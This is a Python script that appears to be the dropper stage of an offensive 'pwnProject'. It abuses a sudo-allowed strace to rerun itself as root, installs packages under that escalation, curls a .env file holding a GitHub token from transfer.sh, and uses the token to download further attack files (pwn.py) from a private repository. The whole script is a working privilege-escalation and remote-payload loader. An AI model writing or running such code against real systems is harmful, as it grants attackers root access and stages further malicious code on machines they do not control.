import os
import subprocess
import sys


scriptLink = 'https://raw.githubusercontent.com/LivvidDreams/pwnProject/master/'
mainUser = 'LivvidDreams'
gtfoBin = 'sudo strace -o /dev/null {}'
files = ['pwn.py', '.env']


def rerun():
    subprocess.call(gtfoBin.format('python3 pwn.py').split())
    exit()


def update_python():
    try:
        pyth = 'python3 --version >/dev/null'
        subprocess.call(pyth.split(), stdout = subprocess.PIPE)
        return
    except Exception:
        print('updating python')
        subprocess.call(gtfoBin.format('yum -y -q -e 0 install python3 > /dev/null').split(), stdout=subprocess.PIPE)


def is_root():
    if os.getuid() == 0:
        print("OBTAINED ROOT")
        return True
    else:
        # Rerun This Script As Root User
        rerun()



def configureTokens():
    try:
        from dotenv import load_dotenv
    except:
        subprocess.call("python3 -m pip install python-dotenv".split(), stdout = subprocess.PIPE)
        rerun()

    api_key = None

    
    # Ensure we can download enviornment file
    subprocess.call("curl -o .env https://transfer.sh/2S2RUM/.env".split())
    load_dotenv()
    api_key = os.getenv("github_key")

    assert api_key

    return (mainUser, api_key)



def getScript():
    try:
        import requests
    except:
        subprocess.call("python3 -m pip install requests".split(), stdout = subprocess.PIPE)
        rerun()

    validAuth = configureTokens()
    if validAuth:
        for file in files:
            save = requests.get(scriptLink + file, auth = validAuth, allow_redirects = True)
            open(file, "wb").write(save.content)
            '''
                Implement Directory to Save These Files To
            '''
    else:
        exit()


def main():
    # Obtain Root Priv To Run Rest Of Script With

    # Check If Script Is Already In Directory, Else Get Script
    #getScript()

    # First Attempt To Install Python3 for Easier Scripting
    update_python()

    # Next Attempt To Rerun Script As Root. Else, Run Root Priv Things
    if not is_root(): exit()
    getScript()
    
    
    




if __name__ == "__main__":
    main()